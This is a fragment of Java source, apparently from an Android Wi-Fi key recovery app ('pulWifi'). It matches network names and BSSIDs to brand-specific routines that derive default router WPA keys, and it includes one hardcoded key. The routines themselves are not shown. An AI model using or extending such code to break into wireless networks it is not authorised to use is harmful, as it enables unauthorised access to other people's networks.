		for(int x = 0; x < matcher_md5C.length; x+=2) 
			if(matcher_md5C[x].find() && matcher_md5C[x+1].find())
				return crack1(matcher_md5C[x].group(1), matcher_md5C[x+1].group(1).replace(":", "").toUpperCase());
		for(int x = 0; x < matcher_md5Z.length; x+=2)
			if(matcher_md5Z[x].find() && matcher_md5Z[x+1].find())
				return crack4(matcher_md5Z[x].group(1), matcher_md5Z[x+1].group(1).replace(":", "").toUpperCase());
		for(Matcher match : matcher_hawei) 
			if(match.find())
				return crack3(match.group(1).replace(":", ""));
		for(int x = 0; x < matcher_wlan4xx.length; x+=2)
			if(matcher_wlan4xx[x].find() && matcher_wlan4xx[x+1].find())
				return crack2(matcher_wlan4xx[x].group(1),
						matcher_wlan4xx[x+1].group(1).toUpperCase());
		
		if(matcher_andared.find())
			return "6b629f4c299371737494c61b5a101693a2d4e9e1f3e1320f3ebf9ae379cecf32";
		if(matcher_dlink.find())
			return crackDLink(mBSSID.replace(":","").toUpperCase());

		//for(int x = 0; x < matcher_wlan2X.length; x+=2)
		//if(matcher_wlan2X[x].find() && matcher_wlan2X[x+1].find()) {
			//Log.d("pulWifi","Nos disponemos a usar el algoritmo WLAN2X");
			//return crack_wlan2X_beta(matcher_wlan2X[x+1].group(1).replace(":", "").toUpperCase());
		//}
		// TODO: Thomson algorithm is disabled.
				//for(Matcher match : matcher_thomson)
					//if(match.find())
						//return THOMSON.method1(match.group(1), initial_year, final_year);
		return null;
	}
}